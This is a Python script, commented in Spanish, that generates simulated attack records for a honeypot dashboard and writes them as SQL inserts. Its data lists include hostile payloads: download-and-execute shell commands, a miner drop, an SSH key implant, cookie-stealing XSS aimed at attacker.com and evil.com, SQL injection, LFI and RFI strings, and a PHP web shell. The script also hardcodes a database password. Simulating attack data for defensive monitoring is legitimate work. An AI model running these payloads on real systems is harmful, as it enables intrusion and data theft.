"""
Genera ataques simulados realistas para todos los honeypots y los inserta en la BD.
Ejecutar: python simulate_attacks.py
"""
import psycopg2
import random
import json
import uuid
from datetime import datetime, timezone, timedelta

DB = "postgresql://honeypot_user:69SDuujwK33NvqayiNePAbm@db:5432/honeypot_db"

# ── Fuentes de ataque (IP, país, ciudad, lat, lon) ──────────────────────────
SOURCES = [
    # China
    ("123.126.44.151", "China",          "CN", "Beijing",   39.91,  116.39),
    ("221.226.44.179", "China",          "CN", "Shanghai",  31.23,  121.47),
    ("116.31.116.20",  "China",          "CN", "Guangzhou", 23.13,  113.26),
    ("112.64.234.123", "China",          "CN", "Chengdu",   30.67,  104.07),
    ("58.218.92.48",   "China",          "CN", "Nanjing",   32.06,  118.78),
    # Rusia
    ("194.165.16.79",  "Russia",         "RU", "Moscow",    55.75,   37.62),
    ("185.220.101.45", "Russia",         "RU", "St. Petersburg", 59.95, 30.32),
    ("80.66.76.48",    "Russia",         "RU", "Novosibirsk", 54.99, 82.90),
    ("91.108.56.100",  "Russia",         "RU", "Yekaterinburg", 56.84, 60.60),
    # Estados Unidos
    ("45.33.32.156",   "United States",  "US", "Dallas",    32.78,  -96.80),
    ("107.182.24.14",  "United States",  "US", "Los Angeles", 34.05, -118.24),
    ("192.241.136.218","United States",  "US", "New York",  40.71,  -74.01),
    ("104.131.0.69",   "United States",  "US", "Atlanta",   33.75,  -84.39),
    # Brasil
    ("177.38.37.71",   "Brazil",         "BR", "São Paulo",  -23.55, -46.63),
    ("186.202.153.176","Brazil",         "BR", "Rio de Janeiro", -22.91, -43.17),
    ("201.20.73.201",  "Brazil",         "BR", "Brasília",  -15.78, -47.93),
    # India
    ("103.88.22.150",  "India",          "IN", "Mumbai",    19.08,   72.88),
    ("117.221.176.54", "India",          "IN", "New Delhi", 28.61,   77.21),
    ("182.73.108.229", "India",          "IN", "Bangalore", 12.97,   77.59),
    # Alemania
    ("5.8.88.104",     "Germany",        "DE", "Frankfurt", 50.11,    8.68),
    ("185.100.87.48",  "Germany",        "DE", "Berlin",    52.52,   13.40),
    ("195.54.160.148", "Germany",        "DE", "Munich",    48.14,   11.58),
    # Países Bajos
    ("185.220.101.33", "Netherlands",    "NL", "Amsterdam", 52.37,    4.90),
    ("185.220.100.254","Netherlands",    "NL", "Rotterdam", 51.92,    4.48),
    # Ucrania
    ("185.150.26.55",  "Ukraine",        "UA", "Kyiv",      50.45,   30.52),
    ("178.160.199.91", "Ukraine",        "UA", "Kharkiv",   49.99,   36.23),
    # Rumanía
    ("5.2.69.58",      "Romania",        "RO", "Bucharest", 44.43,   26.10),
    ("89.248.165.209", "Romania",        "RO", "Cluj-Napoca", 46.77, 23.59),
    # Corea del Sur
    ("121.130.115.225","South Korea",    "KR", "Seoul",     37.57,  126.98),
    ("175.45.178.183", "South Korea",    "KR", "Busan",     35.10,  129.04),
    # Francia
    ("176.139.113.145","France",         "FR", "Paris",     48.86,    2.35),
    ("109.190.118.217","France",         "FR", "Lyon",      45.75,    4.85),
    # Reino Unido
    ("185.56.83.82",   "United Kingdom", "GB", "London",    51.51,   -0.13),
    ("95.181.198.192", "United Kingdom", "GB", "Manchester", 53.48,  -2.24),
    # Singapur
    ("167.99.172.180", "Singapore",      "SG", "Singapore",  1.35,  103.82),
    ("139.59.193.207", "Singapore",      "SG", "Singapore",  1.35,  103.82),
    # Japón
    ("133.242.217.220","Japan",          "JP", "Tokyo",     35.69,  139.69),
    ("157.7.69.153",   "Japan",          "JP", "Osaka",     34.69,  135.50),
    # Irán
    ("37.98.243.57",   "Iran",           "IR", "Tehran",    35.69,   51.42),
    ("45.90.168.124",  "Iran",           "IR", "Mashhad",   36.30,   59.61),
    # Vietnam
    ("113.160.44.9",   "Vietnam",        "VN", "Ho Chi Minh City", 10.82, 106.63),
    ("123.30.234.55",  "Vietnam",        "VN", "Hanoi",     21.03,  105.83),
    # Argentina
    ("190.210.69.13",  "Argentina",      "AR", "Buenos Aires", -34.61, -58.44),
    # Turquía
    ("176.88.133.196", "Turkey",         "TR", "Istanbul",  41.01,   28.95),
    # México
    ("189.234.209.11", "Mexico",         "MX", "Mexico City", 19.43, -99.13),
    # Indonesia
    ("36.90.188.149",  "Indonesia",      "ID", "Jakarta",   -6.21,  106.85),
    # Tailandia
    ("171.97.197.183", "Thailand",       "TH", "Bangkok",   13.75,  100.52),
]

# ── Datos por honeypot ──────────────────────────────────────────────────────

SSH_USERS = [
    "root","admin","ubuntu","pi","test","user","guest","oracle","postgres",
    "hadoop","ftpuser","nagios","ansible","deploy","ec2-user","centos",
    "debian","www-data","git","jenkins","mysql","redis","mongodb","elastic",
]
SSH_PASSWORDS = [
    "123456","password","admin","root","12345","qwerty","111111","1234567",
    "dragon","master","pass","letmein","monkey","abc123","welcome","login",
    "admin123","password1","123123","default","toor","alpine","raspberry",
    "P@ssw0rd","changeme","secret","test123","1q2w3e4r","qazwsx","zxcvbn",
]
SSH_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "id",
    "whoami",
    "wget http://45.33.32.156/shell.sh -O /tmp/.sh && chmod +x /tmp/.sh && /tmp/.sh",
    "curl -s http://185.220.101.45/b2f628/b.sh | bash",
    "cat /proc/cpuinfo | grep -c processor",
    "free -m",
    "ls /home",
    "ps aux | grep -v grep",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> ~/.ssh/authorized_keys",
    "cd /tmp; wget http://112.64.234.123/miner -O .m; chmod +x .m; ./.m &",
    "crontab -l",
    "netstat -an",
    "iptables -F",
]

WEB_PAYLOADS = [
    # SQL injection
    ("sql_injection", "GET", "/login.php?id=1' OR '1'='1--"),
    ("sql_injection", "GET", "/search?q=' UNION SELECT username,password FROM users--"),
    ("sql_injection", "POST", "/admin/login username=admin'--&password=x"),
    ("sql_injection", "GET", "/index.php?cat=1; DROP TABLE users--"),
    ("sql_injection", "GET", "/product?id=1 AND 1=CONVERT(int,@@version)--"),
    # XSS
    ("xss", "GET", "/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"),
    ("xss", "GET", "/comment?text=<img src=x onerror=alert(document.cookie)>"),
    ("xss", "POST", "/profile name=<svg/onload=fetch('http://evil.com/'+btoa(document.cookie))>"),
    # LFI / Path traversal
    ("lfi", "GET", "/page.php?file=../../../../etc/passwd"),
    ("lfi", "GET", "/download?path=../../etc/shadow"),
    ("lfi", "GET", "/include.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"),
    # RFI
    ("rfi", "GET", "/page.php?include=http://185.220.101.45/shell.txt"),
    # Scanner
    ("scanner", "GET", "/wp-admin/"),
    ("scanner", "GET", "/.env"),
    ("scanner", "GET", "/phpinfo.php"),
    ("scanner", "GET", "/.git/config"),
    ("scanner", "GET", "/admin/config.php"),
    ("scanner", "GET", "/actuator/env"),
    ("scanner", "GET", "/api/v1/../../../etc/passwd"),
    ("scanner", "GET", "/shell.php"),
    ("scanner", "POST", "/xmlrpc.php"),
    # Shell upload
    ("webshell_upload", "POST", "/upload.php filename=shell.php&content=<?php system($_GET['cmd']); ?>"),
    ("command_injection", "GET", "/ping?host=127.0.0.1;cat+/etc/passwd"),
]

ICS_PAYLOADS = [
    ("modbus_scan",  502,  "Modbus", "function_code=3 register_read start=0 count=125"),
    ("modbus_scan",  502,  "Modbus", "function_code=1 coil_read start=0 count=2000"),
    ("s7_enum",      102,  "S7",     "s7comm: CPU info request, system_state_list"),
    ("s7_enum",      102,  "S7",     "s7comm: read_var MB0-MB255 data_block=1"),
    ("dnp3_probe",   20000,"DNP3",   "DNP3 link_status outstation_addr=0x0003"),
    ("bacnet_scan",  47808,"BACnet", "who-is broadcast global range 0-4194303"),
    ("enip_scan",    44818,"EtherNet/IP", "CIP list_identity request"),
    ("modbus_scan",  502,  "Modbus", "function_code=43 read_device_identification"),
]

SMB_PAYLOADS = [
    ("smb_exploit",    445, "SMB", "EternalBlue MS17-010 exploit attempt"),
    ("smb_exploit",    445, "SMB", "SMBv1 TRANS2 SESSION_SETUP overflow attempt"),
    ("smb_login",      445, "SMB", "NTLMSSP auth: user=Administrator domain=WORKGROUP"),
    ("smb_login",      445, "SMB", "NTLMSSP auth: user=Guest"),
    ("ftp_login",       21, "FTP", "USER anonymous PASS attacker@example.com"),
    ("ftp_login",       21, "FTP", "USER admin PASS admin"),
    ("ftp_brute",       21, "FTP", "USER root PASS toor"),
    ("mysql_brute",   3306, "MySQL", "auth: user=root password="),
    ("mysql_brute",   3306, "MySQL", "auth: user=root password=mysql"),
    ("mssql_brute",   1433, "MSSQL", "auth: sa password=sa"),
    ("malware_upload", 445, "SMB",  "File transfer: /tmp/payload.exe (PE32 executable)"),
    ("malware_upload",  21, "FTP",  "STOR update.sh (ELF binary)"),
]

PORT_SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
    1433, 1723, 3306, 3389, 5900, 6379, 8080, 8443, 27017,
]


def random_ts(days_ago_max=7):
    """Timestamp aleatorio en los últimos N días, con distribución realista."""
    now = datetime.now(timezone.utc)
    # Más ataques de noche (UTC 00-08) porque es de día en Asia
    minutes_ago = random.randint(0, days_ago_max * 24 * 60)
    ts = now - timedelta(minutes=minutes_ago)
    # Sesgo: más ataques en las primeras 8 horas UTC
    if random.random() < 0.45:
        ts = ts.replace(hour=random.randint(0, 7))
    return ts


def make_cowrie(src, ts):
    ip, country, cc, city, lat, lon = src
    attack_type = random.choice(["ssh_brute_force"] * 7 + ["ssh_command_exec"] * 2 + ["telnet_login"])
    user = random.choice(SSH_USERS)
    pwd  = random.choice(SSH_PASSWORDS)
    payload = None
    if attack_type == "ssh_command_exec":
        payload = random.choice(SSH_COMMANDS)
    raw = {
        "event_type": "cowrie.login.failed" if attack_type == "ssh_brute_force" else "cowrie.command.input",
        "src_ip": ip, "username": user, "password": pwd,
        "protocol": "ssh" if attack_type != "telnet_login" else "telnet",
        "version": random.choice(["SSH-2.0-libssh2_1.8.2", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-PuTTY_Release_0.73"]),
    }
    return dict(
        timestamp=ts, honeypot="cowrie", source_ip=ip,
        source_port=random.randint(49152, 65535),
        dest_port=22 if attack_type != "telnet_login" else 23,
        protocol="TCP", country=country, country_code=cc, city=city,
        latitude=lat, longitude=lon,
        attack_type=attack_type, username=user, password=pwd,
        payload=payload,
        session_id=str(uuid.uuid4())[:16],
        raw_data=raw,
    )


def make_glastopf(src, ts):
    ip, country, cc, city, lat, lon = src
    atype, method, req = random.choice(WEB_PAYLOADS)
    ua = random.choice([
        "sqlmap/1.7.8#stable (https://sqlmap.org)",
        "Nikto/2.1.6",
        "Mozilla/5.0 (compatible; Googlebot/2.1)",
        "python-requests/2.28.0",
        "curl/7.68.0",
        "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
        "Mozilla/5.0 zgrab/0.x",
    ])
    raw = {"method": method, "request": req, "user_agent": ua, "status": 200}
    return dict(
        timestamp=ts, honeypot="glastopf", source_ip=ip,
        source_port=random.randint(49152, 65535),
        dest_port=80, protocol="HTTP",
        country=country, country_code=cc, city=city, latitude=lat, longitude=lon,
        attack_type=atype, username=None, password=None,
        payload=f"{method} {req}",
        session_id=None,
        raw_data=raw,
    )


def make_conpot(src, ts):
    ip, country, cc, city, lat, lon = src
    atype, port, proto, payload = random.choice(ICS_PAYLOADS)
    raw = {"protocol": proto, "request": payload, "function": atype}
    return dict(
        timestamp=ts, honeypot="conpot", source_ip=ip,
        source_port=random.randint(49152, 65535),
        dest_port=port, protocol=proto,
        country=country, country_code=cc, city=city, latitude=lat, longitude=lon,
        attack_type=atype, username=None, password=None,
        payload=payload, session_id=None,
        raw_data=raw,
    )


def make_dionaea(src, ts):
    ip, country, cc, city, lat, lon = src
    atype, port, proto, payload = random.choice(SMB_PAYLOADS)
    user = pwd = None
    if "login" in atype or "brute" in atype:
        user = random.choice(["admin", "Administrator", "root", "sa", "anonymous"])
        pwd  = random.choice(["", "admin", "password", "123456", "sa"])
    raw = {"protocol": proto, "payload": payload}
    return dict(
        timestamp=ts, honeypot="dionaea", source_ip=ip,
        source_port=random.randint(49152, 65535),
        dest_port=port, protocol=proto,
        country=country, country_code=cc, city=city, latitude=lat, longitude=lon,
        attack_type=atype, username=user, password=pwd,
        payload=payload, session_id=None,
        raw_data=raw,
    )


def make_honeytrap(src, ts):
    ip, country, cc, city, lat, lon = src
    port  = random.choice(PORT_SCAN_PORTS)
    atype = random.choice(["port_scan", "syn_scan", "service_probe", "banner_grab"])
    payload = f"SYN probe to port {port}" if atype == "syn_scan" else f"Service probe: port {port}"
    raw = {"scan_type": atype, "target_port": port, "flags": "SYN" if "syn" in atype else "ACK"}
    return dict(
        timestamp=ts, honeypot="honeytrap", source_ip=ip,
        source_port=random.randint(49152, 65535),
        dest_port=port, protocol="TCP",
        country=country, country_code=cc, city=city, latitude=lat, longitude=lon,
        attack_type=atype, username=None, password=None,
        payload=payload, session_id=None,
        raw_data=raw,
    )


def make_honeyd(src, ts):
    ip, country, cc, city, lat, lon = src
    atype = random.choice(["network_scan", "icmp_ping", "arp_scan", "tcp_syn_scan"])
    proto = "ICMP" if "icmp" in atype or "ping" in atype else ("ARP" if "arp" in atype else "TCP")
    port  = None if proto in ("ICMP", "ARP") else random.choice([22, 80, 443, 3389, 445])
    payload = f"ICMP echo-request id={random.randint(1,9999)}" if proto == "ICMP" else f"Virtual host probe: {atype}"
    raw = {"protocol": proto, "scan_type": atype}
    return dict(
        timestamp=ts, honeypot="honeyd", source_ip=ip,
        source_port=random.randint(1024, 65535) if proto == "TCP" else None,
        dest_port=port, protocol=proto,
        country=country, country_code=cc, city=city, latitude=lat, longitude=lon,
        attack_type=atype, username=None, password=None,
        payload=payload, session_id=None,
        raw_data=raw,
    )


MAKERS = [
    (make_cowrie,    35),
    (make_glastopf,  22),
    (make_conpot,    13),
    (make_dionaea,   12),
    (make_honeytrap, 12),
    (make_honeyd,     6),
]

def weighted_maker():
    pool = []
    for fn, weight in MAKERS:
        pool.extend([fn] * weight)
    return random.choice(pool)


def esc(v):
    """Escapa un valor para SQL."""
    if v is None:
        return "NULL"
    if isinstance(v, (int, float)):
        return str(v)
    if isinstance(v, datetime):
        return f"'{v.strftime('%Y-%m-%d %H:%M:%S+00')}'"
    s = str(v).replace("'", "''")
    return f"'{s}'"


def main():
    random.seed(42)
    N = 520
    lines = []
    print(f"Generando {N} ataques simulados...")

    for i in range(N):
        src    = random.choice(SOURCES)
        ts     = random_ts(days_ago_max=7)
        maker  = weighted_maker()
        r      = maker(src, ts)
        raw    = json.dumps(r["raw_data"]) if r.get("raw_data") else None

        lines.append(
            f"INSERT INTO attacks "
            f"(timestamp,honeypot,source_ip,source_port,dest_port,protocol,"
            f"country,country_code,city,latitude,longitude,"
            f"attack_type,username,password,payload,session_id,raw_data) VALUES ("
            f"{esc(r['timestamp'])},{esc(r['honeypot'])},{esc(r['source_ip'])},"
            f"{esc(r['source_port'])},{esc(r['dest_port'])},{esc(r['protocol'])},"
            f"{esc(r['country'])},{esc(r['country_code'])},{esc(r['city'])},"
            f"{esc(r['latitude'])},{esc(r['longitude'])},"
            f"{esc(r['attack_type'])},{esc(r['username'])},{esc(r['password'])},"
            f"{esc(r['payload'])},{esc(r['session_id'])},{esc(raw)});"
        )

    sql_path = "/tmp/attacks_sim.sql"
    with open(sql_path, "w") as f:
        f.write("\n".join(lines))
    print(f"✓ SQL generado en {sql_path} ({len(lines)} registros)")


if __name__ == "__main__":
    main()
